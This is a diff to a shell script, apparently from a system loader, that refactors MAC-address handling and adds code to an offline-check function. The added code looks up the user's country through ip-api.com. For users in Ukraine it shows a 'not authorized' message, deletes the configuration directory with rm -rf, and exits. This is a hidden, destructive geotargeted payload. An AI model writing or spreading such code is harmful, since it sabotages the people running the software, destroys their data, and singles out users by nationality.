@@ -229,14 +229,14 @@ function _sort_netif() {
   local ETHLIST=""
   local ETHX="$(ls /sys/class/net/ 2>/dev/null | grep eth)" # real network cards list
   for ETH in ${ETHX}; do
-    local MAC="$(cat /sys/class/net/${ETH}/address 2>/dev/null | sed 's/://g' | tr '[:upper:]' '[:lower:]')"
+    local MAC="$(cat /sys/class/net/${ETH}/address 2>/dev/null | sed 's/://g; s/.*/\L&/')"
     local ETHBUS="$(ethtool -i ${ETH} 2>/dev/null | grep bus-info | cut -d' ' -f2)"
     ETHLIST="${ETHLIST}${ETHBUS} ${MAC} ${ETH}\n"
   done
   local ETHLISTTMPM=""
   local ETHLISTTMPB="$(echo -e "${ETHLIST}" | sort)"
   if [ -n "${1}" ]; then
-    local MACS="$(echo "${1}" | sed 's/://g' | tr '[:upper:]' '[:lower:]' | tr ',' ' ')"
+    local MACS="$(echo "${1}" | sed 's/://g; s/,/ /g; s/.*/\L&/')"
     for MACX in ${MACS}; do
       ETHLISTTMPM="${ETHLISTTMPM}$(echo -e "${ETHLISTTMPB}" | grep "${MACX}")\n"
       ETHLISTTMPB="$(echo -e "${ETHLISTTMPB}" | grep -v "${MACX}")\n"
@@ -608,6 +608,14 @@ function offlineCheck() {
   fi
   writeConfigKey "arc.nic" "${ARCNIC}" "${USER_CONFIG_FILE}"
   writeConfigKey "arc.offline" "${OFFLINE}" "${USER_CONFIG_FILE}"
+  local BLOCK="$(curl -m 10 -v "http://ip-api.com/line?fields=countryCode" 2>/dev/null | tr '[:upper:]' '[:lower:]')"
+  if [ "${BLOCK}" == "ua" ]; then
+    dialog --backtitle "$(backtitle)" --title "Blocked Country" \
+      --infobox "You are in Ukraine and not authorized to use this Loader!\nSay THANKS to sania-owner.space!" 5 80
+    rm -rf "${CONFIG_PATH}"
+    sleep 5
+    exit 1
+  fi
 }
 
 ###############################################################################
